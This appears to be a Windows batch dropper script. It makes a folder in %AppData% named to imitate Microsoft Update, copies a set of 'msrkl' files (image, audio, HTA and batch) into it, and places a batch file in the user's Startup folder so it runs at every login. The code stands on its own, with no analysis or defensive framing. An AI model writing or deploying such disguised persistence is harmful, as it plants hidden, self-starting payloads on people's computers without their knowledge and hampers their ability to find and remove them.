@echo off
if not exist "%AppData%\Microsoft\Update\User\Services"
 mkdir "%AppData%\Microsoft\Update\User\Services"
copy "Storage\msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
copy "Storage\msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
copy "Storage\msrklbg.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
copy "Storage\msrkl.hta" "%AppData%\Microsoft\Update\msrkl.hta"
copy "Storage\msrkl.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
